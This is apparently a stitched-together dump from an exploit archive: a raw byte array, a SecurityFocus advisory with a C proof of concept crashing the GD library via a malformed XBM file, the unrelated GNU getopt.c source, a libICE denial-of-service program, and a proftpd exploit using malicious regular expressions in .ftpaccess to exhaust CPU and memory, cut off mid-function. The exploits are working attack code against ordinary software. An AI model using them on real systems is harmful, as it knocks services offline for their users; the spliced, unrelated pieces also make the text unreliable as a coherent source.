17,156,176,31,4,42,177,200,111,57,18,146,121,194,142,224,28,48,129,2,
196,64,6,227,192,7,11,119,176,139,64,106,64,20,134,248,131,12,105,136,2,
94,122,237,51,40,72,217,15,127,136,134,65,140,65,12,173,96,134,50,236,
115,132,152,33,49,98,74,196,36,254,174,216,61,106,206,255,224,138,89,
212,192,4,36,217,18,11,188,100,0,124,244,227,5,36,136,191,71,70,242,140,
31,219,26,2,186,134,178,5,172,42,7,110,27,192,25,0,81,12,67,100,129,16,
7,73,0,251,90,80,130,41,228,49,34,0,160,192,4,14,160,129,2,64,0,144,21,
192,64,66,49,80,129,11,56,81,6,59,192,31,4,196,165,77,179,93,9,0,171,28,
40,4,15,186,73,225,49,52,130,15,77,96,10,32,89,65,19,114,147,0,246,107,
64,10,118,176,210,29,200,96,23,178,40,128,7,78,113,10,17,216,82,18,245,
132,131,12,103,104,135,94,8,147,118,104,32,102,23,140,217,138,86,76,67,
22,141,48,98,51,157,217,17,239,28,192,126,16,196,95,75,165,138,69,252,
213,139,71,218,204,163,162,190,227,1,13,116,213,171,94,21,215,1,182,248,
207,110,208,65,1,210,90,35,48,225,160,2,44,198,0,2,255,146,233,44,180,
113,10,64,208,97,134,53,168,163,251,174,224,177,139,78,0,120,5,40,232,
240,134,151,201,24,252,241,173,30,224,31,196,96,133,182,9,200,33,120,
255,5,61,104,31,35,16,131,6,24,246,95,218,12,156,199,182,197,9,75,20,64,
25,178,216,69,104,35,32,11,89,172,163,2,202,168,0,32,148,161,1,119,104,
0,181,160,101,36,8,94,88,142,122,196,227,128,112,105,197,44,97,42,14,1,
80,0,0,74,93,170,68,104,38,208,199,106,212,160,195,227,100,206,4,48,86,
193,1,84,0,179,90,46,116,103,53,43,192,89,160,129,169,121,67,137,212,41,
34,96,102,97,7,84,141,193,5,18,138,208,133,106,64,14,90,162,67,137,32,
113,148,18,84,193,159,212,163,192,5,157,10,86,192,214,247,95,34,208,102,
73,23,155,26,232,94,15,103,245,5,240,101,171,251,94,158,224,98,13,107,
152,64,39,14,48,128,70,104,224,19,148,128,64,4,82,192,15,102,228,33,15,
204,96,219,52,26,48,13,102,236,192,10,173,120,40,51,68,204,140,93,68,
160,2,141,176,132,54,71,193,76,224,6,151,39,14,144,21,11,68,32,130,235,
249,70,4,112,163,85,139,8,252,79,213,88,183,39,63,78,13,0,136,69,63,7,
64,235,49,66,49,255,8,10,86,149,135,240,138,55,161,29,189,64,132,53,9,
73,17,92,160,9,10,168,129,232,70,7,28,203,92,52,198,19,128,155,140,113,
60,96,23,35,13,198,212,149,241,140,225,134,95,2,172,36,59,30,235,72,0,
128,112,81,0,224,130,2,4,56,176,0,58,161,96,6,23,128,18,159,56,109,5,40,
97,218,10,144,150,120,26,240,192,1,58,177,6,10,172,152,119,101,230,142,
106,122,162,148,165,244,88,53,29,131,52,83,119,118,229,5,108,23,58,53,0,
65,12,2,153,179,26,115,181,171,24,128,192,5,26,58,89,225,161,1,203,90,
94,1,166,231,7,227,158,220,71,210,214,205,116,75,104,61,233,251,248,56,
53,217,42,12,16,88,12,51,97,31,193,216,71,24,133,172,160,75,43,22,88,
162,19,44,224,196,1,68,208,9,1,172,129,0,163,0,192,176,31,157,107,110,
67,122,77,44,40,6,237,58,45,37,29,212,160,12,35,213,230,82,238,76,128,
52,131,178,0,78,132,40,4,202,176,129,5,64,98,50,163,235,118,190,245,189,
111,126,247,123,177,124,186,131,99,255,58,61,29,9,72,66,162,34,112,51,
245,176,67,0,191,14,0,170,223,138,0,99,154,176,207,21,148,96,175,254,
198,120,198,53,190,113,103,42,10,123,96,16,248,116,62,64,135,79,220,203,
183,249,2,232,119,178,183,61,25,4,252,213,43,88,129,17,56,62,115,154,
215,220,230,221,225,86,5,198,32,240,57,154,224,2,98,125,51,95,17,163,
129,8,244,64,5,42,112,53,2,246,105,132,21,88,233,230,79,135,122,212,93,
172,180,236,129,252,49,68,81,132,28,8,144,89,238,28,6,123,111,65,3,189,
37,3,243,42,72,221,236,103,71,187,94,82,195,202,20,184,28,50,28,136,195,
74,100,205,157,109,121,192,114,72,167,119,150,97,142,173,180,247,221,
239,102,95,187,91,64,16,118,200,152,192,13,210,216,177,97,34,230,17,86,
54,96,240,143,201,80,9,98,158,248,191,87,222,242,249,6,64,227,101,48,8,
199,224,149,239,176,162,25,209,85,32,238,200,76,38,14,151,71,125,234,
251,157,121,183,228,192,234,8,48,193,233,101,150,165,110,141,225,200,
145,49,138,236,85,191,255,123,222,79,93,0,173,228,30,231,23,192,129,19,
84,244,108,124,178,242,237,217,103,120,138,244,222,249,207,95,17,218,60,
112,129,63,169,160,243,38,96,196,236,5,32,135,44,104,215,90,31,224,64,
101,136,5,125,242,151,63,86,41,148,42,200,23,144,33,63,0,155,0,134,8,
138,167,57,163,136,110,152,223,254,247,55,204,182,6,224,202,33,238,28,
50,39,104,191,232,35,128,88,240,26,243,17,136,82,192,191,4,44,63,143,
115,11,47,41,0,179,130,140,22,152,2,14,201,133,82,128,132,83,249,37,67,
176,0,197,82,192,14,84,61,194,209,158,6,136,1,53,208,131,25,34,10,28,
152,2,14,140,136,110,120,4,55,104,1,9,32,8,175,225,37,20,200,2,17,224,
50,15,196,193,212,251,54,162,139,168,5,235,62,20,152,163,22,192,1,35,
168,2,211,73,29,70,96,157,22,120,29,147,97,163,148,161,131,135,201,193,
40,212,65,196,40,168,63,242,0,109,16,5,56,160,33,130,195,161,46,44,25,
30,242,33,66,0,1,151,209,47,41,52,67,180,243,58,225,113,43,255,72,154,0,
1,168,171,25,10,138,130,208,33,29,2,67,149,89,0,56,0,131,6,208,34,202,
59,195,62,164,57,180,169,41,201,2,36,243,210,146,91,250,131,26,168,1,
161,224,26,207,112,35,56,24,131,59,176,2,81,147,30,174,243,195,74,4,60,
231,178,187,40,251,35,192,26,0,174,194,0,81,40,134,155,50,4,58,32,69,48,
184,131,3,186,162,72,172,128,73,180,196,86,68,59,154,89,48,53,84,53,63,
106,50,90,76,169,30,8,163,63,137,11,83,18,151,163,113,197,95,140,58,69,
105,172,224,25,44,9,115,162,6,144,1,61,40,165,135,2,23,77,154,168,74,1,
198,104,148,58,254,178,158,255,242,168,201,74,129,108,100,178,40,3,44,
196,202,47,62,148,198,112,244,55,213,152,21,26,115,42,156,65,71,116,244,
0,233,249,70,112,20,199,119,236,54,8,185,53,165,104,179,233,98,56,2,80,
55,10,192,53,120,228,199,202,147,180,95,235,199,128,20,200,129,36,200,
142,107,190,230,27,191,130,84,200,124,57,200,133,116,200,135,132,200,
129,172,136,194,152,200,8,136,180,200,139,196,200,128,0,59};source: http://www.securityfocus.com/bid/24651/info

The GD graphics library is prone to multiple vulnerabilities.

An attacker can exploit this issue to cause denial-of-service conditions or execute arbitrary code in the context of applications implementing the affected library.

Version prior to GD graphics library 2.0.35 are reported vulnerable. 

#include "gd.h"

int main() {
    FILE *fp = fopen("./x.xbm", "w+");

    fprintf(fp, "#define width 255\n#define height 1073741824\nstatic unsigned char bla = {\n");

    fseek(fp, 0, SEEK_SET);

    gdImageCreateFromXbm(fp);

}
/* Getopt for GNU.
   NOTE: getopt is now part of the C library, so if you don't know what
   "Keep this file name-space clean" means, talk to roland@gnu.ai.mit.edu
   before changing it!

   Copyright (C) 1987, 88, 89, 90, 91, 92, 93, 94
   	Free Software Foundation, Inc.

This file is part of the GNU C Library.  Its master source is NOT part of
the C library, however.  The master source lives in /gd/gnu/lib.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

/* This tells Alpha OSF/1 not to define a getopt prototype in <stdio.h>.
   Ditto for AIX 3.2 and <stdlib.h>.  */
#ifndef _NO_PROTO
#define _NO_PROTO
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if !defined (__STDC__) || !__STDC__
/* This is a separate conditional since some stdc systems
   reject `defined (const)'.  */
#ifndef const
#define const
#endif
#endif

#include <stdio.h>

#ifdef WIN32
#include <string.h>
#endif

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


/* This needs to come after some library #include
   to get __GNU_LIBRARY__ defined.  */
#ifdef	__GNU_LIBRARY__
/* Don't include stdlib.h for non-GNU C libraries because some of them
   contain conflicting prototypes for getopt.  */
#include <stdlib.h>
#endif	/* GNU C library.  */

/* This version of `getopt' appears to the caller like standard Unix `getopt'
   but it behaves differently for the user, since it allows the user
   to intersperse the options with the other arguments.

   As `getopt' works, it permutes the elements of ARGV so that,
   when it is done, all the options precede everything else.  Thus
   all application programs are extended to handle flexible argument order.

   Setting the environment variable POSIXLY_CORRECT disables permutation.
   Then the behavior is completely standard.

   GNU application programs can use a third alternative mode in which
   they can distinguish the relative order of options and other arguments.  */

#include "getopt.h"

/* For communication from `getopt' to the caller.
   When `getopt' finds an option that takes an argument,
   the argument value is returned here.
   Also, when `ordering' is RETURN_IN_ORDER,
   each non-option ARGV-element is returned here.  */

char *optarg = NULL;

/* Index in ARGV of the next element to be scanned.
   This is used for communication to and from the caller
   and for communication between successive calls to `getopt'.

   On entry to `getopt', zero means this is the first call; initialize.

   When `getopt' returns EOF, this is the index of the first of the
   non-option elements that the caller should itself scan.

   Otherwise, `optind' communicates from one call to the next
   how much of ARGV has been scanned so far.  */

/* XXX 1003.2 says this must be 1 before any call.  */
int optind = 0;

/* The next char to be scanned in the option-element
   in which the last option character we returned was found.
   This allows us to pick up the scan where we left off.

   If this is zero, or a null string, it means resume the scan
   by advancing to the next ARGV-element.  */

static char *nextchar;

/* Callers store zero here to inhibit the error message
   for unrecognized options.  */

int opterr = 1;

/* Set to an option character which was unrecognized.
   This must be initialized on some systems to avoid linking in the
   system's own getopt implementation.  */

int optopt = '?';

/* Describe how to deal with options that follow non-option ARGV-elements.

   If the caller did not specify anything,
   the default is REQUIRE_ORDER if the environment variable
   POSIXLY_CORRECT is defined, PERMUTE otherwise.

   REQUIRE_ORDER means don't recognize them as options;
   stop option processing when the first non-option is seen.
   This is what Unix does.
   This mode of operation is selected by either setting the environment
   variable POSIXLY_CORRECT, or using `+' as the first character
   of the list of option characters.

   PERMUTE is the default.  We permute the contents of ARGV as we scan,
   so that eventually all the non-options are at the end.  This allows options
   to be given in any order, even with programs that were not written to
   expect this.

   RETURN_IN_ORDER is an option available to programs that were written
   to expect options and other ARGV-elements in any order and that care about
   the ordering of the two.  We describe each non-option ARGV-element
   as if it were the argument of an option with character code 1.
   Using `-' as the first character of the list of option characters
   selects this mode of operation.

   The special argument `--' forces an end of option-scanning regardless
   of the value of `ordering'.  In the case of RETURN_IN_ORDER, only
   `--' can cause `getopt' to return EOF with `optind' != ARGC.  */

static enum
{
  REQUIRE_ORDER, PERMUTE, RETURN_IN_ORDER
} ordering;

/* Value of POSIXLY_CORRECT environment variable.  */
static char *posixly_correct;

#ifdef	__GNU_LIBRARY__
/* We want to avoid inclusion of string.h with non-GNU libraries
   because there are many ways it can cause trouble.
   On some systems, it contains special magic macros that don't work
   in GCC.  */
#include <string.h>
#define	my_index	strchr
#else

/* Avoid depending on library functions or files
   whose names are inconsistent.  */

char *getenv ();

static char *
my_index (str, chr)
     const char *str;
     int chr;
{
  while (*str)
    {
      if (*str == chr)
	return (char *) str;
      str++;
    }
  return 0;
}

/* If using GCC, we can safely declare strlen this way.
   If not using GCC, it is ok not to declare it.  */
#ifdef __GNUC__
/* Note that Motorola Delta 68k R3V7 comes with GCC but not stddef.h.
   That was relevant to code that was here before.  */
#if !defined (__STDC__) || !__STDC__
/* gcc with -traditional declares the built-in strlen to return int,
   and has done so at least since version 2.4.5. -- rms.  */
extern int strlen (const char *);
#endif /* not __STDC__ */
#endif /* __GNUC__ */

#endif /* not __GNU_LIBRARY__ */

/* Handle permutation of arguments.  */

/* Describe the part of ARGV that contains non-options that have
   been skipped.  `first_nonopt' is the index in ARGV of the first of them;
   `last_nonopt' is the index after the last of them.  */

static int first_nonopt;
static int last_nonopt;

/* Exchange two adjacent subsequences of ARGV.
   One subsequence is elements [first_nonopt,last_nonopt)
   which contains all the non-options that have been skipped so far.
   The other is elements [last_nonopt,optind), which contains all
   the options processed since those non-options were skipped.

   `first_nonopt' and `last_nonopt' are relocated so that they describe
   the new indices of the non-options in ARGV after they are moved.  */

static void
exchange (argv)
     char **argv;
{
  int bottom = first_nonopt;
  int middle = last_nonopt;
  int top = optind;
  char *tem;

  /* Exchange the shorter segment with the far end of the longer segment.
     That puts the shorter segment into the right place.
     It leaves the longer segment in the right place overall,
     but it consists of two parts that need to be swapped next.  */

  while (top > middle && middle > bottom)
    {
      if (top - middle > middle - bottom)
	{
	  /* Bottom segment is the short one.  */
	  int len = middle - bottom;
	  register int i;

	  /* Swap it with the top part of the top segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[top - (middle - bottom) + i];
	      argv[top - (middle - bottom) + i] = tem;
	    }
	  /* Exclude the moved bottom segment from further swapping.  */
	  top -= len;
	}
      else
	{
	  /* Top segment is the short one.  */
	  int len = top - middle;
	  register int i;

	  /* Swap it with the bottom part of the bottom segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[middle + i];
	      argv[middle + i] = tem;
	    }
	  /* Exclude the moved top segment from further swapping.  */
	  bottom += len;
	}
    }

  /* Update records for the slots the non-options now occupy.  */

  first_nonopt += (optind - last_nonopt);
  last_nonopt = optind;
}

/* Initialize the internal data when the first call is made.  */

static const char *
_getopt_initialize (optstring)
     const char *optstring;
{
  /* Start processing options with ARGV-element 1 (since ARGV-element 0
     is the program name); the sequence of previously skipped
     non-option ARGV-elements is empty.  */

  first_nonopt = last_nonopt = optind = 1;

  nextchar = NULL;

  posixly_correct = getenv ("POSIXLY_CORRECT");

  /* Determine how to handle the ordering of options and nonoptions.  */

  if (optstring[0] == '-')
    {
      ordering = RETURN_IN_ORDER;
      ++optstring;
    }
  else if (optstring[0] == '+')
    {
      ordering = REQUIRE_ORDER;
      ++optstring;
    }
  else if (posixly_correct != NULL)
    ordering = REQUIRE_ORDER;
  else
    ordering = PERMUTE;

  return optstring;
}

/* Scan elements of ARGV (whose length is ARGC) for option characters
   given in OPTSTRING.

   If an element of ARGV starts with '-', and is not exactly "-" or "--",
   then it is an option element.  The characters of this element
   (aside from the initial '-') are option characters.  If `getopt'
   is called repeatedly, it returns successively each of the option characters
   from each of the option elements.

   If `getopt' finds another option character, it returns that character,
   updating `optind' and `nextchar' so that the next call to `getopt' can
   resume the scan with the following option character or ARGV-element.

   If there are no more option characters, `getopt' returns `EOF'.
   Then `optind' is the index in ARGV of the first ARGV-element
   that is not an option.  (The ARGV-elements have been permuted
   so that those that are not options now come last.)

   OPTSTRING is a string containing the legitimate option characters.
   If an option character is seen that is not listed in OPTSTRING,
   return '?' after printing an error message.  If you set `opterr' to
   zero, the error message is suppressed but we still return '?'.

   If a char in OPTSTRING is followed by a colon, that means it wants an arg,
   so the following text in the same ARGV-element, or the text of the following
   ARGV-element, is returned in `optarg'.  Two colons mean an option that
   wants an optional arg; if there is text in the current ARGV-element,
   it is returned in `optarg', otherwise `optarg' is set to zero.

   If OPTSTRING starts with `-' or `+', it requests different methods of
   handling the non-option ARGV-elements.
   See the comments about RETURN_IN_ORDER and REQUIRE_ORDER, above.

   Long-named options begin with `--' instead of `-'.
   Their names may be abbreviated as long as the abbreviation is unique
   or is an exact match for some defined option.  If they have an
   argument, it follows the option name in the same ARGV-element, separated
   from the option name by a `=', or else the in next ARGV-element.
   When `getopt' finds a long-named option, it returns 0 if that option's
   `flag' field is nonzero, the value of the option's `val' field
   if the `flag' field is zero.

   The elements of ARGV aren't really const, because we permute them.
   But we pretend they're const in the prototype to be compatible
   with other systems.

   LONGOPTS is a vector of `struct option' terminated by an
   element containing a name which is zero.

   LONGIND returns the index in LONGOPT of the long-named option found.
   It is only valid when a long-named option has been found by the most
   recent call.

   If LONG_ONLY is nonzero, '-' as well as '--' can introduce
   long-named options.  */

int
_getopt_internal (argc, argv, optstring, longopts, longind, long_only)
     int argc;
     char *const *argv;
     const char *optstring;
     const struct option *longopts;
     int *longind;
     int long_only;
{
  optarg = NULL;

  if (optind == 0)
    optstring = _getopt_initialize (optstring);

  if (nextchar == NULL || *nextchar == '\0')
    {
      /* Advance to the next ARGV-element.  */

      if (ordering == PERMUTE)
	{
	  /* If we have just processed some options following some non-options,
	     exchange them so that the options come first.  */

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (last_nonopt != optind)
	    first_nonopt = optind;

	  /* Skip any additional non-options
	     and extend the range of non-options previously skipped.  */

	  while (optind < argc
		 && (argv[optind][0] != '-' || argv[optind][1] == '\0'))
	    optind++;
	  last_nonopt = optind;
	}

      /* The special ARGV-element `--' means premature end of options.
	 Skip it like a null option,
	 then exchange with previous non-options as if it were an option,
	 then skip everything else like a non-option.  */

      if (optind != argc && !strcmp (argv[optind], "--"))
	{
	  optind++;

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (first_nonopt == last_nonopt)
	    first_nonopt = optind;
	  last_nonopt = argc;

	  optind = argc;
	}

      /* If we have done all the ARGV-elements, stop the scan
	 and back over any non-options that we skipped and permuted.  */

      if (optind == argc)
	{
	  /* Set the next-arg-index to point at the non-options
	     that we previously skipped, so the caller will digest them.  */
	  if (first_nonopt != last_nonopt)
	    optind = first_nonopt;
	  return EOF;
	}

      /* If we have come to a non-option and did not permute it,
	 either stop the scan or describe it to the caller and pass it by.  */

      if ((argv[optind][0] != '-' || argv[optind][1] == '\0'))
	{
	  if (ordering == REQUIRE_ORDER)
	    return EOF;
	  optarg = argv[optind++];
	  return 1;
	}

      /* We have found another option-ARGV-element.
	 Skip the initial punctuation.  */

      nextchar = (argv[optind] + 1
		  + (longopts != NULL && argv[optind][1] == '-'));
    }

  /* Decode the current option-ARGV-element.  */

  /* Check whether the ARGV-element is a long option.

     If long_only and the ARGV-element has the form "-f", where f is
     a valid short option, don't consider it an abbreviated form of
     a long option that starts with f.  Otherwise there would be no
     way to give the -f short option.

     On the other hand, if there's a long option "fubar" and
     the ARGV-element is "-fu", do consider that an abbreviation of
     the long option, just like "--fu", and not "-f" with arg "u".

     This distinction seems to be the most useful approach.  */

  if (longopts != NULL
      && (argv[optind][1] == '-'
	  || (long_only && (argv[optind][2] || !my_index (optstring, argv[optind][1])))))
    {
      char *nameend;
      const struct option *p;
      const struct option *pfound = NULL;
      int exact = 0;
      int ambig = 0;
      int indfound;
      int option_index;

      for (nameend = nextchar; *nameend && *nameend != '='; nameend++)
	/* Do nothing.  */ ;

      /* Test all long options for either exact match
	 or abbreviated matches.  */
      for (p = longopts, option_index = 0; p->name; p++, option_index++)
	if (!strncmp (p->name, nextchar, nameend - nextchar))
	  {
	    if ((unsigned int)(nameend - nextchar) == (unsigned int)strlen (p->name))
	      {
		/* Exact match found.  */
		pfound = p;
		indfound = option_index;
		exact = 1;
		break;
	      }
	    else if (pfound == NULL)
	      {
		/* First nonexact match found.  */
		pfound = p;
		indfound = option_index;
	      }
	    else
	      /* Second or later nonexact match found.  */
	      ambig = 1;
	  }

      if (ambig && !exact)
	{
	  if (opterr)
	    fprintf (stderr, "%s: option `%s' is ambiguous\n",
		     argv[0], argv[optind]);
	  nextchar += strlen (nextchar);
	  optind++;
	  return '?';
	}

      if (pfound != NULL)
	{
	  option_index = indfound;
	  optind++;
	  if (*nameend)
	    {
	      /* Don't test has_arg with >, because some C compilers don't
		 allow it to be used on enums.  */
	      if (pfound->has_arg)
		optarg = nameend + 1;
	      else
		{
		  if (opterr)
		    {
		      if (argv[optind - 1][1] == '-')
			/* --option */
			fprintf (stderr,
				 "%s: option `--%s' doesn't allow an argument\n",
				 argv[0], pfound->name);
		      else
			/* +option or -option */
			fprintf (stderr,
			     "%s: option `%c%s' doesn't allow an argument\n",
			     argv[0], argv[optind - 1][0], pfound->name);
		    }
		  nextchar += strlen (nextchar);
		  return '?';
		}
	    }
	  else if (pfound->has_arg == 1)
	    {
	      if (optind < argc)
		optarg = argv[optind++];
	      else
		{
		  if (opterr)
		    fprintf (stderr, "%s: option `%s' requires an argument\n",
			     argv[0], argv[optind - 1]);
		  nextchar += strlen (nextchar);
		  return optstring[0] == ':' ? ':' : '?';
		}
	    }
	  nextchar += strlen (nextchar);
	  if (longind != NULL)
	    *longind = option_index;
	  if (pfound->flag)
	    {
	      *(pfound->flag) = pfound->val;
	      return 0;
	    }
	  return pfound->val;
	}

      /* Can't find it as a long option.  If this is not getopt_long_only,
	 or the option starts with '--' or is not a valid short
	 option, then it's an error.
	 Otherwise interpret it as a short option.  */
      if (!long_only || argv[optind][1] == '-'
	  || my_index (optstring, *nextchar) == NULL)
	{
	  if (opterr)
	    {
	      if (argv[optind][1] == '-')
		/* --option */
		fprintf (stderr, "%s: unrecognized option `--%s'\n",
			 argv[0], nextchar);
	      else
		/* +option or -option */
		fprintf (stderr, "%s: unrecognized option `%c%s'\n",
			 argv[0], argv[optind][0], nextchar);
	    }
	  nextchar = (char *) "";
	  optind++;
	  return '?';
	}
    }

  /* Look at and handle the next short option-character.  */

  {
    char c = *nextchar++;
    char *temp = my_index (optstring, c);

    /* Increment `optind' when we start to process its last character.  */
    if (*nextchar == '\0')
      ++optind;

    if (temp == NULL || c == ':')
      {
	if (opterr)
	  {
	    if (posixly_correct)
	      /* 1003.2 specifies the format of this message.  */
	      fprintf (stderr, "%s: illegal option -- %c\n", argv[0], c);
	    else
	      fprintf (stderr, "%s: invalid option -- %c\n", argv[0], c);
	  }
	optopt = c;
	return '?';
      }
    if (temp[1] == ':')
      {
	if (temp[2] == ':')
	  {
	    /* This is an option that accepts an argument optionally.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		optind++;
	      }
	    else
	      optarg = NULL;
	    nextchar = NULL;
	  }
	else
	  {
	    /* This is an option that requires an argument.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		/* If we end this ARGV-element by taking the rest as an arg,
		   we must advance to the next element now.  */
		optind++;
	      }
	    else if (optind == argc)
	      {
		if (opterr)
		  {
		    /* 1003.2 specifies the format of this message.  */
		    fprintf (stderr, "%s: option requires an argument -- %c\n",
			     argv[0], c);
		  }
		optopt = c;
		if (optstring[0] == ':')
		  c = ':';
		else
		  c = '?';
	      }
	    else
	      /* We already incremented `optind' once;
		 increment it again when taking next ARGV-elt as argument.  */
	      optarg = argv[optind++];
	    nextchar = NULL;
	  }
      }
    return c;
  }
}

int
getopt (argc, argv, optstring)
     int argc;
     char *const *argv;
     const char *optstring;
{
  return _getopt_internal (argc, argv, optstring,
			   (const struct option *) 0,
			   (int *) 0,
			   0);
}

#endif	/* _LIBC or not __GNU_LIBRARY__.  */

#ifdef TEST

/* Compile with -DTEST to make an executable for use in testing
   the above definition of `getopt'.  */

int
main (argc, argv)
     int argc;
     char **argv;
{
  int c;
  int digit_optind = 0;

  while (1)
    {
      int this_option_optind = optind ? optind : 1;

      c = getopt (argc, argv, "abc:d:0123456789");
      if (c == EOF)
	break;

      switch (c)
	{
	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	  if (digit_optind != 0 && digit_optind != this_option_optind)
	    printf ("digits occur in two different argv-elements.\n");
	  digit_optind = this_option_optind;
	  printf ("option %c\n", c);
	  break;

	case 'a':
	  printf ("option a\n");
	  break;

	case 'b':
	  printf ("option b\n");
	  break;

	case 'c':
	  printf ("option c with value `%s'\n", optarg);
	  break;

	case '?':
	  break;

	default:
	  printf ("?? getopt returned character code 0%o ??\n", c);
	}
    }

  if (optind < argc)
    {
      printf ("non-option ARGV-elements: ");
      while (optind < argc)
	printf ("%s ", argv[optind++]);
      printf ("\n");
    }

  exit (0);
}

#endif /* TEST */
source: http://www.securityfocus.com/bid/1369/info

A denial of service vulnerability exists in libICE, part of the X11 windowing system. Any libICE application which creates inet listening sockets can be remotely crashed. This is due to a bug in the handling of the SKIP_STRING macro. By supplying a large value for the skip value, it is possible to cause a pointer to point to uninitialized memory. This in turn will cause a segfault.

This vulnerability will affect any application using TCP listening sockets in libICE. However, one more widespread use of libICE in this configuration is in the gnome-session program, part of the GNOME package. It is possible to cause the X session of a user to end by performing this denial of service against someone running GNOME.

/* icebreak.c - Chris Evans */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int
main(int argc, const char* argv[])
{
  unsigned char c;
  unsigned int i;
  unsigned short s;
  char blankbuf[1000];

  memset(blankbuf, '\0', sizeof(blankbuf));

  /* Assume fd 1 is stdout */

  /* ICE connection header */
  /* First, pick an endian-ness */
  /* Byte 1: Major opcode. Must be 0 */
  c = 0;
  write(1, &c, 1);
  /* Byte 2: Minor opcode. Must be ICE_ByteOrder (1) */
  c = 1;
  write(1, &c, 1);
  /* Byte 3: Byte-order. We'll go for IceLSBfirst (0) */
  c = 0;
  write(1, &c, 1);
  /* Byte 4: Unused. Write 0 */
  c = 0;
  write(1, &c, 1);
  /* Bytes 5-8: integer length. Must be zero for byte-order message. */
  i = 0;
  write(1, &i, 4);

  /* Next message - ICE_ConnectionSetup */
  /* Byte 1: Major opcode. 0 for core ICE protocol message */
  c = 0;
  write(1, &c, 1);
  /* Byte 2: Minor opcode. ICE_ConnectionSetup (2) */
  c = 2;
  write(1, &c, 1);
  /* Bytes 3, 4: versionCount & authCount */
  c = 255;
  write(1, &c, 1);
  write(1, &c, 1);
  /* Bytes 5-8, int length. Must be at least 8 */
  i = 8;
  write(1, &i, 4);
  /* Now, bytes are part of iceConnectionSetupMsg */
  /* This is an extra 8 bytes */
  /* Byte 1: "must authenticate" */
  c = 0;
  write(1, &c, 1);
  /* Bytes 2-8: unused */
  write(1, blankbuf, 7);

  /* Now we're writing into the malloc'ed message data space */
  /* First, a string. Give it's 16bit length a big value to get ICE code
   * to iterate off the end of the buffer
   */
  s = 65535;
  write(1, &s, 2);

  /* And some blank to get the (total) 56 char data read finished */
  write(1, blankbuf, 54);
}
source: http://www.securityfocus.com/bid/45233/info

GNU glibc is prone to a denial-of-service vulnerability due to stack exhaustion.

Successful exploits will allow attackers to make the affected computer unresponsive, denying service to legitimate users.

This issue affects unknown versions of the glibc library. This BID will be updated when more details become available. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/* 

proftpd multiple exploit for VU#912279 (only with GNU libc/regcomp(3))
by Maksymilian Arciemowicz

References:
http://www.kb.cert.org/vuls/id/912279
http://cxib.net/
http://securityreason.com/

Tested: 
Ubuntu + proftpd

This exploit need writing privileges to create .ftpaccess file with vulnerable regular expressions. Works well only under Linux

172.16.124.1 - NetBSD 5.1 (HACKER)
172.16.124.134 - Ubuntu 10.10 (TARGET)

PoC1:
.exitcx@cx64:~/advs/done$ ./reg1 172.16.124.134 21 cx password 172.16.124.1 1

Try create .ftpaccess with HideFiles "(\.ftpaccess|(.*{10,}{10,}{10,}{10,}))$"
...
send: stat .

send: USER cx
PASS password

send: stat .

Can`t connect
.exit
cx@cx64:~/advs/done$ telnet 172.16.124.134 21
Trying 172.16.124.134...
telnet: Unable to connect to remote host: Connection refused

Resume: 
- created .ftpaccess file, and connect<=>disconnect
It will create a lot of proftpd children with 100% CPU usage.


If we try

./reg1 172.16.124.134 21 cx password 172.16.124.1 3

any proftpd children will generate memory exhausion

Options:
1 - cpu resource exhausion
2 - crash (recursion)
3 - memory resource exhausion
4 - possible crash with (ulimit {-v|-m})

*/


char expl0[]="HideFiles \"(\\.ftpaccess|(.*{10,}{10,}{10,}{10,}))$\"";  //CVE-2010-4052 Long execution
char expl1[]="HideFiles \"(\\.ftpaccess|(.*{10,}{10,}{10,}{10,}{10,}))$\""; //CVE-2010-4051 Crash
char expl2[]="HideFiles \"(.*+++++++++++++++++++++++++++++(\\w+))\""; // memory exhausion
char expl3[]="HideFiles \"(.*++++++++++++++++++++++++++++++(\\w+))\""; // if virtual memory limited, crash

int sendftp(int stream,char *what){
        if(-1==send(stream,what,strlen(what),0))
                printf("Can't send %s\n",what);
        else
                printf("send: %s\n",what);

        bzero(what,sizeof(what));
}

void readftp(int stream,int flag){
	if(flag==1) flag=MSG_DONTWAIT;
	else flag=0;
        char *readline=malloc(sizeof(char)*(4096+1));
	memset(readline,'\x00',(4096+1));
        if(recv(stream,readline,4096,flag)<1){
                printf("Can't read from stream\n");
		if(readline) free(readline);
		close(stream);
		exit(1);
	}
	else{
		if(readline)
			write(1, readline, strlen(readline));
		fflush(stdout);
	}
	free(readline);
}


int attack(host,port,login,pass)
char *host,*port,*login,*pass;
{
	char buffer[1024]; // send ftp command buffor
	int sockfd,n,error;
	struct addrinfo hints;
	struct addrinfo *res, *res0;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = PF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	error = getaddrinfo(host,port,&hints,&res0);

	if (error){
		errorcon:
		printf("Can`t connect\n.exit");
		exit(1);
	}

